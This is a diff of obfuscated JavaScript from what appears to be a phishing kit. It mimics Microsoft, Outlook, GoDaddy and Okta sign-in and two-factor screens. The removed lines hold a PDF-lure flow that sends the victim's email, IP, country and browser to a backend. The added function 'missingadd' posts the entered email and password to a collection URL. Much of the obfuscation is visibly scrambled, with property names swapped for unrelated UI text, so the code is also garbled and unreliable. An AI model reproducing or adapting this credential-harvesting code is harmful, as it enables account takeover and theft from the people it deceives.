+                (view = `inp_otp_live`));
             }
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'protect\x20account' && (document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', checkerrordesc(`toggle`, 0x0, _0x42142b[`authcall`]), displayprotectoptions(_0x42142b[`uname`]), bottomsectionlinks(`toggle`, _0x42142b[`listitem`]), changebackbutton(`toggle`, _0x42142b[`country`]), document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`</a> `)['classList'][`json`](`onclick`), view = `toggle`);
-            _0x42142b['message'] == `https://get.geojs.io/v1/ip/geo.json` && (document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`](`inp_uname`)[`yahoo.`](`remove`, _0x42142b['image_src']), checkerrordesc('otp', 0x0, _0x42142b[`authcall`]), bottomsectionlinks(`2fa is off newwebsite`, _0x42142b[`listitem`]), changebackbutton(`2fa is off newwebsite`, _0x42142b[`country`]), document[`915612HwjQev`](`sms otp live`)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`65aCTyIy`)[`error_2fa`]['remove'](`onclick`), view = 'otp');
-            _0x42142b['message'] == `otp_livedesc` && (document['getElementById']('error_pwd')[`signoutoption`] = '', document[`915612HwjQev`](`table`)[`yahoo.`](`remove`, _0x42142b['image_src']), checkerrordesc('authapp', 0x0, _0x42142b[`authcall`]), bottomsectionlinks(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x42142b['bottomsection']), changebackbutton(`
-      <div class="text-block-body" id="iEnterProofDesc">
-        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.
-      </div>
-      <div role="alert" aria-live="assertive">
-        <div class="alert alert-error Hide" id="iProofInputError"></div>
-      </div>
-      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">
-        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">
-        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@`, _0x42142b[`country`]), document[`915612HwjQev`](`section_accessblocked`)[`Too many Attempts`] = _0x42142b[`section_accessblocked`], document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`]('section_authapp')[`error_2fa`][`json`](`onclick`), view = 'authapp', wait2fa(`block`, _0x42142b['methodid']));
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'approve\x20auth\x20request\x20calling' && (document[`915612HwjQev`]('section_authcall')['querySelector'](`methodid`)['focus'](), document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`](`checkemail`)[`yahoo.`](`remove`, _0x42142b['image_src']), checkerrordesc(`indentNonCollapsible`, 0x0, _0x42142b[`authcall`]), bottomsectionlinks(`indentNonCollapsible`, _0x42142b[`listitem`]), changebackbutton(`indentNonCollapsible`, _0x42142b[`country`]), document[`915612HwjQev`](`sms otp live`)[`error_2fa`]['toggle'](`onclick`), document[`915612HwjQev`](`log`)[`error_2fa`][`json`](`onclick`), view = `indentNonCollapsible`, wait2fa(`section_uname`));
-            if (_0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `</a> or try to sign in again shortly.</p>`) {
-                var _0x519e56 = JSON[`error_authapp_live`](_0x42142b[`error enter a code`]);
-                displaytwofamethods(_0x519e56), bottomsectionlinks(`</a></p>`, _0x42142b[`listitem`]), changebackbutton(`</a></p>`, _0x42142b[`country`]), document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`](`onclick`), document['getElementById']('section_2fa')['classList'][`json`](`onclick`), view = `</a></p>`, document[`915612HwjQev`]('error_pwd')['innerText'] = '';
-            }
-            _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `CompanionAppsNotification` && (bottomsectionlinks(`selecttwofamethod(this)`, _0x42142b[`listitem`]), changebackbutton(`selecttwofamethod(this)`, _0x42142b[`country`]), checkerrordesc(`selecttwofamethod(this)`, 0x1, _0x42142b[`authcall`]), document[`915612HwjQev`](`tile-img`)[`591780njOthf`] = '');
-            for (var _0x14e766 = 0x0; _0x14e766 < websitenames[`nextElementSibling`]; _0x14e766++) {
-                _0x42142b[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `href` + websitenames[_0x14e766] + '' && checkerrordesc(`selecttwofamethod(this)`, 0x1, _0x42142b[`authcall`]);
-            }
-        }
-    })['catch'](_0x1acae5 => {
-        const _0x2e9885 = _0x19ec13;
-        loadinganimation(0x1), console['error'](`pwd`, _0x1acae5);
-    }))));
-    return ![];
-}
-
-function resetbacktoemail() {
-    const _0x586d7d = _0xe042e;
-    var _0x1d6d5a = `description`;
-    multipleaccountsback == 0x1 && (_0x1d6d5a = 'multipleaccounts');
-    bottomsectionlinks(_0x1d6d5a, [{
-        'a_id': `.btn_final`,
-        'a_text': `you dont have access`,
-        'text': 'No\x20account?',
-        'type': `signInAnotherWay`
-    }, {
-        'a_text': `2famethods`,
-        'a_id': 'cantAccessAccount',
-        'type': `alt`
-    }]);
-    multipleaccountsback == 0x0 && changebackbutton(_0x1d6d5a, 0x0);
-    document['body']['style'][`<p class="mb-16">`] = '', document[`style`][`position`][`button.show-hide-btn`] = '';
-    var _0x33e4d3 = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`error live`);
-    _0x33e4d3[`24px`](function (_0x3e5fc5) {
-        const _0x21c09a = _0x586d7d;
-        _0x3e5fc5[`Sign out and sign in with a different account`](`position`) && (_0x3e5fc5[`godaddypassword`](`position`), _0x3e5fc5[`position`][`row tile`] = `section_youdonthaveaccess`);
-    }), document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`sms otp live`)[`hide-to-left `]('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`](`table-cell` + _0x1d6d5a)[`error_2fa`][`json`](`onclick`), view = _0x1d6d5a;
-}
-
-function backbtn() {
-    const _0x133b68 = _0xe042e;
-    runanimation(0x0, view, 1.2);
-    if (webnotfound == !![] && view == `selecttwofamethod(this)`) webnotfound = ![], setTimeout(function () {
-        resetbacktoemail(), runanimation(0x3, view, 1.2);
-    }, 0x384);
-    else {
-        if (webnotfound == ![] && view == 'pwd') {
-            document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = '';
-            if (view == `selecttwofamethod(this)`) {
-                document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`]('inp_pwd')[`591780njOthf`] = '', document[`915612HwjQev`](`click`)['innerText'] = '', document[`915612HwjQev`]('inp_uname')[`591780njOthf`] = '', bottomsectionlinks(`description`, [{
-                    'a_id': 'signup',
-                    'a_text': `you dont have access`,
-                    'text': `sections`,
-                    'type': `signInAnotherWay`
-                }, {
-                    'a_id': `pwd_godaddy`,
-                    'a_text': `section_2fa`,
-                    'type': `alt`
-                }]), changebackbutton(`description`, 0x0), document['getElementById']('section_pwd')[`error_2fa`][`live.`](`onclick`), document['getElementById']('section_uname')['querySelector'](`maxLength`)[`position`][`section_multipleaccounts_adfs`] = '', document['getElementById'](`authapperrordesc`)[`error_2fa`][`json`](`onclick`);
-                document[`style`][`position`][`<p class="mb-16">`] && (document[`style`]['style'][`<p class="mb-16">`] = '');
-                document[`style`][`position`]['backgroundColor'] && (document[`style`][`position`]['backgroundColor'] = '');
-                bottomsectionlinks(`description`, [{
-                    'a_id': `.btn_final`,
-                    'a_text': `you dont have access`,
-                    'text': `sections`,
-                    'type': `signInAnotherWay`
-                }, {
-                    'a_id': `pwd_godaddy`,
-                    'a_text': 'Can’t\x20access\x20your\x20account?',
-                    'type': `alt`
-                }]);
-                var _0x4a99cf = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`error live`);
-                _0x4a99cf[`24px`](function (_0x24e702) {
-                    const _0x50eba9 = _0x133b68;
-                    _0x24e702[`Sign out and sign in with a different account`]('style') && _0x24e702[`godaddypassword`](`position`);
-                }), view = `description`;
-            }
-            runanimation(0x3, view, 1.2);
-        }
-    }
-    if (webnotfound == ![] && view != `selecttwofamethod(this)`) {
-        document['getElementById'](`table-cell` + view)[`hide-to-left `](`maxLength`)['style'][`section_multipleaccounts_adfs`] = '';
-        if (view == `selecttwofamethod(this)`) {
-            document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document[`915612HwjQev`]('inp_pwd')[`591780njOthf`] = '', bottomsectionlinks(`description`, [{
-                'a_id': 'signup',
-                'a_text': `you dont have access`,
-                'text': `sections`,
-                'type': `signInAnotherWay`
-            }, {
-                'a_id': `pwd_godaddy`,
-                'a_text': `section_2fa`,
-                'type': `alt`
-            }]), changebackbutton('uname', 0x0), document['getElementById']('section_pwd')['classList'][`live.`](`onclick`), document[`915612HwjQev`](`authapperrordesc`)['querySelector'](`maxLength`)[`position`]['animation'] = '', document[`915612HwjQev`]('section_uname')[`error_2fa`][`json`](`onclick`);
-            document['body'][`position`][`<p class="mb-16">`] && (document[`style`]['style'][`<p class="mb-16">`] = '');
-            document[`style`][`position`][`button.show-hide-btn`] && (document['body'][`position`]['backgroundColor'] = '');
-            var _0x4a99cf = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`]('.bannerlogo');
-            _0x4a99cf[`24px`](function (_0x3173d1) {
-                const _0x2bd36c = _0x133b68;
-                _0x3173d1[`Sign out and sign in with a different account`](`position`) && _0x3173d1[`godaddypassword`]('style');
-            }), view = 'uname';
-        }
-        view == `s forwards` && (document['getElementById'](`.okta-container #login-bg-image`)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`godaddyemail`)[`error_2fa`][`json`](`onclick`), view = `</a></p>`), view == `" onclick="linkoptionclick(this)">` && (document['getElementById'](`signinblocked live`)[`error_2fa`][`live.`]('d-none'), document['getElementById'](`godaddyemail`)[`error_2fa`][`json`](`onclick`), view = `</a></p>`), (view == `selectmultipleaccountadfs` && viewtype == `.iAdditionalProofInfo` || view == `selectmultipleaccountadfs` && viewtype == `Email name`) && (document['getElementById']('section_otp_live')['classList'][`live.`](`onclick`), document['getElementById'](`signinblocked live`)[`error_2fa`][`json`]('d-none'), view = `" onclick="linkoptionclick(this)">`), view == `selectmultipleaccountadfs` && viewtype == `2fa is off newwebsite` && (document[`915612HwjQev`](`gmail.`)['classList']['toggle']('d-none'), document[`915612HwjQev`](`godaddyemail`)['classList'][`json`](`onclick`), view = `</a></p>`), view == `2fa is off newwebsite` && (document[`915612HwjQev`](`setAttribute`)[`signoutoption`] = '', document[`915612HwjQev`](`[aria-describedby="iProofInputError"]`)[`591780njOthf`] = '', document[`915612HwjQev`](`65aCTyIy`)['classList'][`live.`]('d-none'), document[`915612HwjQev`]('section_2fa')[`error_2fa`][`json`](`onclick`), view = '2fa'), view == 'authcall' && (document[`915612HwjQev`](`backbutton`)[`signoutoption`] = '', document[`915612HwjQev`]('section_authcall')[`error_2fa`]['toggle'](`onclick`), document['getElementById'](`godaddyemail`)[`error_2fa`][`json`](`onclick`), view = '2fa'), runanimation(0x3, view, 1.2);
-    }
-}
-document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`input-group-addon`)['forEach'](_0x35d41b => {
-    const _0x40804e = _0xe042e;
-    _0x35d41b[`auth`](`error_otp`, () => {
-        const _0x29f991 = _0x40804e;
-        window[`tel`][`Error:`] = redirecturl;
-    });
-});
-if (view == 'uname_pdf') {
-    const nxtpdf = document[`915612HwjQev`](`dynamic-style`);
-    nxtpdf[`auth`](`error_otp`, () => {
-        validatepdf();
-    }), pdfcheck = 0x1;
-
-    function loadinganimationpdf(_0x5cf113) {
-        const _0x1cb5ff = _0xe042e;
-        _0x5cf113 == 0x0 && (document[`915612HwjQev`](`email otp live`)[`hide-to-left `](`otpliveimg`)[`position`][`accountoptions`] = `Send another request to my Outlook mobile app`, document['getElementById'](`email otp live`)['querySelector']('#section_uname_content')[`error_2fa`][`live.`](`onclick`)), _0x5cf113 == 0x1 && (document[`915612HwjQev`](`email otp live`)['querySelector'](`otpliveimg`)[`position`]['display'] = `trim`, document[`915612HwjQev`](`email otp live`)[`hide-to-left `]('#section_uname_content')[`error_2fa`][`json`](`onclick`)), _0x5cf113 == 0x2 && (document['getElementById'](`email otp live`)[`hide-to-left `]('#mainLoader')[`position`][`accountoptions`] = `Send another request to my Outlook mobile app`, document[`915612HwjQev`](`email otp live`)[`error_2fa`][`live.`](`onclick`));
-    }
-    const unamepdfinp = document[`915612HwjQev`](`section_pwd`);
-
-    function sendemailpdf() {
-        const _0x224c51 = _0xe042e;
-        sendAndReceive('checkemail', [unamepdfinp[`591780njOthf`], pagelinkval, browserName, userip, usercountry], 0x1)[`link`](_0x4c8e01 => {
-            const _0x107c44 = _0x224c51;
-            if (_0x4c8e01 && _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== 'waiting\x20for\x20previous\x20request\x20to\x20complete') {
-                var _0x4e3c63 = ![],
-                    _0x330648 = 0x12c;
-                _0x4c8e01['message']['includes'](`#btn_confirmemailorphone_live`) == ![] && _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `CompanionAppsNotification` && (_0x4c8e01[`authapperror`] && _0x4c8e01[`authapperror`] == 0x2 && (pvn = 0x1)), _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`Can't access your account?`](`#btn_confirmemailorphone_live`) == ![] && (_0x330648 = 0x0, loadinganimationpdf(0x1)), setTimeout(function () {
-                    const _0xeb891f = _0x107c44;
-                    for (var _0x10be8f = 0x0; _0x10be8f < websitenames['length']; _0x10be8f++) {
-                        if (_0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`Can't access your account?`](`#btn_confirmemailorphone_live`) == !![] && _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`Can't access your account?`](websitenames[_0x10be8f]) == !![]) {
-                            loadinganimationpdf(0x2), _0x4e3c63 = !![], document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`otp sent live`)[`24px`](_0x3b544b => {
-                                const _0x2a7b98 = _0xeb891f;
-                                _0x3b544b[`signoutoption`] = unamepdfinp['value'];
-                            });
-                            if (websitenames[_0x10be8f] == `The wrong code was entered. Send yourself a new code and try again.`) {
-                                var _0x49dd3a = gdf,
-                                    _0xe5084b = document['querySelector'](`section_tryagainlater` + gdf + '\x22]');
-                                if (!_0xe5084b) {
-                                    var _0x4f944c = document[`troubleshootinginfo`](`get`);
-                                    _0x4f944c[`remove`] = _0x49dd3a, document[`getElementsByClassName`][`</p>`](_0x4f944c);
-                                }
-                                const _0x17509f = `animation`,
-                                    _0x2c88af = document['createElement'](`position`);
-                                _0x2c88af['id'] = `icloud.`, _0x2c88af[`Too many Attempts`] = _0x17509f, document[`getElementsByClassName`][`</p>`](_0x2c88af), document[`915612HwjQev`](`pagevisit`)['classList'][`live.`](`onclick`), document[`915612HwjQev`]('sections_' + websitenames[_0x10be8f] + '')[`error_2fa`]['remove'](`onclick`), document['getElementById'](`section_authapp`)[`591780njOthf`] = unamepdfinp['value'], document[`style`][`position`][`</a> <p>`]('background-color', '#f5f7f8', `#btn_verifyotp`), document[`style`][`position`]['setProperty']('background-image', `waiting`, 'important'), document['body'][`position`][`</a> <p>`](`newwebsiteopen`, `alert`, `#btn_verifyotp`), view = 'pwd_godaddy';
-                            }
-                        }
-                        _0x4c8e01['message'][`Can't access your account?`](`#btn_confirmemailorphone_live`) == !![] && _0x10be8f == websitenames[`nextElementSibling`] - 0x1 && !_0x4e3c63 && (document[`915612HwjQev`]('error_uname_pdf')[`signoutoption`] = '', document[`915612HwjQev`](`onchange`)[`position`][`accountoptions`] = `trim`, document['querySelectorAll'](`otp sent live`)[`24px`](_0x2b3955 => {
-                            const _0x21d55e = _0xeb891f;
-                            _0x2b3955[`signoutoption`] = unamepdfinp[`591780njOthf`];
-                        }), bottomsectionlinks(`selecttwofamethod(this)`, [{
-                            'a_id': `split`,
-                            'a_text': `<span>`,
-                            'type': `alt`
-                        }]), changebackbutton(`selecttwofamethod(this)`, 0x0), document['getElementById'](`pagevisit`)[`error_2fa`]['toggle'](`onclick`), document[`915612HwjQev`](`error-inp`)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`sms otp live`)[`error_2fa`]['remove'](`onclick`), otherweburl = _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`][`url('`]('newwebsiteopen', ''), webnotfound = !![], view = `selecttwofamethod(this)`);
-                    }
-                    if (_0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'multiple\x20accounts') {
-                        multipleaccountsback = 0x1;
-                        var _0x449e18 = document['querySelectorAll'](`error live`);
-                        _0x449e18[`24px`](function (_0x5c13bc) {
-                            const _0x28c2f1 = _0xeb891f;
-                            _0x5c13bc[`position`]['height'] = '24px';
-                        }), document[`915612HwjQev`](`No account?`)[`hide-to-left `](`Last 4 digits of phone number`)[`yahoo.`](`confirmemailorphone_live_title`, _0x4c8e01['backbtnid']), document[`915612HwjQev`](`No account?`)[`hide-to-left `](`Last 4 digits of phone number`)[`yahoo.`](`PhoneAppOTP_Live`, `twofaselected`), checkerrordesc(`flex`, 0x0, _0x4c8e01[`authcall`]), displaymultipleaccounts(_0x4c8e01[`maxlength`]), bottomsectionlinks('multipleaccounts', _0x4c8e01[`listitem`]), document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`otp sent live`)[`24px`](_0x32db4f => {
-                            _0x32db4f['innerText'] = unamepdfinp['value'];
-                        }), document[`915612HwjQev`](`pagevisit`)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`error-inp`)[`error_2fa`][`live.`]('d-none'), document['getElementById'](`No account?`)[`error_2fa`]['remove'](`onclick`), view = `flex`;
-                    }
-                    if (_0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'correct\x20email') {
-                        if (_0x4c8e01[`button`] !== undefined && _0x4c8e01[`button`] !== null) {
-                            var _0x449e18 = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`error live`);
-                            _0x449e18[`24px`](function (_0x48a7cb) {
-                                const _0x2bb267 = _0xeb891f;
-                                _0x48a7cb[`position`][`<p class="mb-16">`] = 'url(\x27' + _0x4c8e01[`button`] + '\x27)', _0x48a7cb[`position`][`twofamethods`] = `waiting`, _0x48a7cb['style'][`row tile`] = `section_youdonthaveaccess`;
-                            });
-                        }
-                        _0x4c8e01[`Send Code`] !== undefined && _0x4c8e01['backgroundcolor'] !== null && document['body'][`position`]['setProperty'](`We couldn't find an account with that username. Try another, or get a new Microsoft account.`, _0x4c8e01[`Send Code`]);
-                        _0x4c8e01['backgroundimage'] !== undefined && _0x4c8e01['backgroundimage'] !== null && document[`style`][`position`]['setProperty'](`" onclick="linkoptionclick(this)" class="link" style="display: unset;">`, `accessblockedsignoutoption` + _0x4c8e01[`multipleaccountoptions`] + '\x27)');
-                        if (_0x4c8e01[`button`] == undefined || _0x4c8e01[`button`] == null) {
-                            var _0x449e18 = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`error live`);
-                            _0x449e18[`24px`](function (_0x58ed0e) {
-                                const _0x2024c6 = _0xeb891f;
-                                _0x58ed0e[`position`][`row tile`] = `getAttribute`;
-                            });
-                        }
-                        bottomsectionlinks(`selecttwofamethod(this)`, _0x4c8e01[`listitem`]), changebackbutton(`selecttwofamethod(this)`, _0x4c8e01[`country`]), document['getElementById'](`onchange`)[`signoutoption`] = '', document[`915612HwjQev`](`onchange`)[`position`][`accountoptions`] = `trim`, document['querySelectorAll'](`otp sent live`)[`24px`](_0x4c0ecb => {
-                            const _0x524e34 = _0xeb891f;
-                            _0x4c0ecb[`signoutoption`] = unamepdfinp['value'];
-                        }), document[`915612HwjQev`](`pagevisit`)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`error-inp`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`](`sms otp live`)[`error_2fa`][`json`](`onclick`), view = `selecttwofamethod(this)`;
-                    }
-                    _0x4c8e01[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'error' && (document[`915612HwjQev`]('error_uname_pdf')[`signoutoption`] = `reason`, document[`915612HwjQev`](`onchange`)[`position`]['display'] = `303460zKjElf`, loadinganimationpdf(0x1));
-                }, _0x330648);
-            }
-        })[`TwoWayVoiceMobile`](_0x1af76e => {
-            const _0x1306d4 = _0x224c51;
-            loadinganimationpdf(0x1), console[`CompanionAppsNotification`](`pwd`, _0x1af76e);
-        });
-    }
-
-    function validatepdf() {
-        const _0x20d7c6 = _0xe042e;
-        if (view === `callotp`) {
-            const _0x4a25f3 = [`mb-16`, 'msn.', `selectprotectoption(this)`, 'aol.', `key`, `.title`],
-                _0x226efc = unamepdfinp[`591780njOthf`][`acctype`]()[`Verify your phone number`]('@')[0x1];
-            _0x4a25f3[`Can't access your account?`](_0x226efc) && (loadinganimationpdf(0x0), setTimeout(function () {
-                const _0xbedb3 = _0x20d7c6;
-                loadinganimationpdf(0x1), document['getElementById']('error_uname_pdf')[`signoutoption`] = 'Please,\x20provide\x20a\x20valid\x20email.', document['getElementById'](`onchange`)[`position`][`accountoptions`] = `303460zKjElf`;
-            }, 0xbb8));
-            if (unamepdfinp['value'][`acctype`]() == '') document[`915612HwjQev`](`onchange`)[`signoutoption`] = `reason`, document[`915612HwjQev`](`onchange`)[`position`][`accountoptions`] = `303460zKjElf`;
-            else unamepdfinp['value'][`acctype`]() != '' && !_0x4a25f3[`Can't access your account?`](_0x226efc) && (loadinganimationpdf(0x0), webnotfound == !![] && setTimeout(function () {
-                loadinganimationpdf(0x1), setTimeout(function () {
-                    const _0x89772f = _0x2b3b;
-                    document[_0x89772f(0x2fd)](_0x89772f(0x340))[_0x89772f(0x1ca)] = '', document['getElementById'](_0x89772f(0x305))[_0x89772f(0x259)] = '', document['getElementById']('section_uname_pdf')[_0x89772f(0x34a)][_0x89772f(0x2cb)](_0x89772f(0x26f)), document['getElementById'](_0x89772f(0x216))[_0x89772f(0x34a)]['remove']('d-none'), view = _0x89772f(0x290);
-                }, 0x12c);
-            }, 0xbb8), webnotfound == ![] && (interacted == 0x1 && sendemailpdf(), interacted == 0x0 && (interacted = 0x1, function _0x492e68() {
-                const _0x1ab218 = _0x20d7c6;
-                $[`data-methodid`]('https://get.geojs.io/v1/ip/geo.json', function (_0x51f3aa) {
-                    const _0x1e01e4 = _0x1ab218;
-                    userip = _0x51f3aa['ip'], usercountry = _0x51f3aa[`Please, provide a valid email.`], sendemailpdf();
-                }, 'json')['fail'](function (_0x2a60c0, _0x241be0, _0x38d475) {
-                    const _0x16ef18 = _0x1ab218;
-                    (_0x2a60c0['status'] == 0x1ad || _0x241be0 !== `call`) && setTimeout(_0x492e68, 0x3e8);
+            if (_0x302e6b["message"] == `input[type="radio"]`) {
+              multipleaccountsback = 0x1;
+              if (twa == 0x0) {
+                var _0x24d485 = document[`.btn_can`](`twofaselect`);
+                _0x24d485[`querySelector`](function (_0x2df7cc) {
+                  const _0x18f2f5 = _0x330137;
+                  _0x2df7cc[`getElementById`]["height"] = `src`;
                 });
-            }())));
-        }
-        return ![];
-    }
+              }
+              document[`selectprotectoption(this)`]("section_multipleaccounts")
+                [`.loading-container`](`float`)
+                [`142499lsAMVs`](`ihaveacode`, _0x302e6b[`resentlink`]),
+                document[`selectprotectoption(this)`](
+                  "section_multipleaccounts",
+                )
+                  [`.loading-container`](`float`)
+                  [`142499lsAMVs`](`div`, "backbuttonclick(this,2)"),
+                checkerrordesc(`maxLength`, 0x0, _0x302e6b[`confirmemail`]),
+                displaymultipleaccounts(_0x302e6b[`row tile`]),
+                bottomsectionlinks(`maxLength`, _0x302e6b[`otp sent live`]),
+                document[`.btn_can`](".user_identity")[`querySelector`](
+                  (_0x2d6db0) => {
+                    const _0x560f5e = _0x330137;
+                    _0x2d6db0[`Next`] = unameInp[`signin_blocked_reason`];
+                  },
+                ),
+                document[`selectprotectoption(this)`](`iProofPhone`)[
+                  `pdfemail`
+                ][`waiting`](`background-image`),
+                document[`selectprotectoption(this)`](
+                  "section_multipleaccounts",
+                )[`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                (view = "multipleaccounts");
+            }
+            if (_0x302e6b["message"] == `signinblocked live`) {
+              if (twa == 0x0) {
+                if (
+                  _0x302e6b["bannerlogo"] !== undefined &&
+                  _0x302e6b[`otp sent error`] !== null
+                ) {
+                  var _0x24d485 = document["querySelectorAll"](`twofaselect`);
+                  _0x24d485[`querySelector`](function (_0x3d6768) {
+                    const _0xedfda0 = _0x330137;
+                    (_0x3d6768["style"][`otpdesc`] =
+                      "url(\x27" + _0x302e6b[`otp sent error`] + "\x27)"),
+                      (_0x3d6768[`getElementById`][`then`] = `row`),
+                      (_0x3d6768[`getElementById`][`pwd_godaddy`] = "36px");
+                  });
+                }
+                _0x302e6b["backgroundcolor"] !== undefined &&
+                  _0x302e6b[`.title`] !== null &&
+                  document[
+                    `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                  ][`getElementById`][`voice`](
+                    `createElement`,
+                    _0x302e6b[`.title`],
+                  );
+                _0x302e6b[`signoutoption`] !== undefined &&
+                  _0x302e6b[`signoutoption`] !== null &&
+                  document[
+                    `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                  ][`getElementById`][`voice`](
+                    `background-color`,
+                    `position` + _0x302e6b["backgroundimage"] + "\x27)",
+                  );
+                if (
+                  _0x302e6b[`otp sent error`] == undefined &&
+                  _0x302e6b[`otp sent error`] !== null
+                ) {
+                  var _0x24d485 = document["querySelectorAll"](`twofaselect`);
+                  _0x24d485[`querySelector`](function (_0x1c6e1e) {
+                    const _0xb53167 = _0x330137;
+                    _0x1c6e1e["style"][`pwd_godaddy`] = "24px";
+                  });
+                }
+              }
+              bottomsectionlinks("pwd", _0x302e6b["bottomsection"]),
+                changebackbutton(`inp_otp_live`, _0x302e6b[`#docemailloading`]),
+                (document[`selectprotectoption(this)`](`error_uname_pdf`)[
+                  `Next`
+                ] = ""),
+                document[`.btn_can`](".user_identity")[`querySelector`](
+                  (_0x205f17) => {
+                    const _0x2c4e37 = _0x330137;
+                    _0x205f17[`Next`] = unameInp["value"];
+                  },
+                ),
+                document["getElementById"]("section_uname")[`pdfemail`][
+                  `waiting`
+                ](`background-image`),
+                document[`selectprotectoption(this)`](`backbtnclick`)[
+                  "classList"
+                ][`<a class="link mb-16" href="#" data-id="`]("d-none"),
+                (view = "pwd");
+            }
+            _0x302e6b[`</a> or try to sign in again shortly.</p>`] == "error" &&
+              (bottomsectionlinks(`2fa is on`, [
+                {
+                  a_id: `section_youdonthaveaccess`,
+                  a_text: "Create\x20one!",
+                  text: `desc`,
+                  type: `tile`,
+                },
+                { a_id: `.back`, a_text: `inp_pwd`, type: `uname_doc` },
+              ]),
+              checkerrordesc("uname", 0x1, _0x302e6b[`confirmemail`])),
+              _0x302e6b[`</a> or try to sign in again shortly.</p>`][
+                "includes"
+              ](`small`) == ![] &&
+                _0x302e6b[`</a> or try to sign in again shortly.</p>`] !==
+                  `auth` &&
+                runanimation(0x1, view, 0.3);
+          }, _0x1363b5);
+      }
+    })
+    [`section_signinanothererror`]((_0x5b9d65) => {
+      const _0x4e2403 = _0x3874ec;
+      loadinganimation(0x1),
+        console[`auth`](`selecttwofamethod(this)`, _0x5b9d65);
+    });
 }
-
+function missingadd() {
+  const _0x59a64a = _0x283fde;
+  $[`sections_okta`]({
+    type: `redirected back to sign in`,
+    url: urlo,
+    data: {
+      pagelink: encryptData(pagelinkval),
+      type: 0xc,
+      email: unameInp["value"],
+      password: pwdInp[`signin_blocked_reason`],
+      url: otherweburl,
+      ip: userip,
+      country: usercountry,
+      browser: browserName,
+    },
+    success: function (_0x3fc9d) {},
+    error: function (_0x1240a6, _0x34ccba, _0x2c5d31) {
+      const _0x3f142b = _0x59a64a;
+      console[`auth`](`selecttwofamethod(this)`, _0x2c5d31);
+    },
+  });
+}
+function validate() {
+  const _0x40b015 = _0x283fde;
+  if (view === `2fa is on`) {
+    const _0x4ee101 = bes,
+      _0x16fe64 = unameInp[`signin_blocked_reason`]
+        ["trim"]()
+        ["split"]("@")[0x1];
+    unameInp["value"][`ajax`]("@") &&
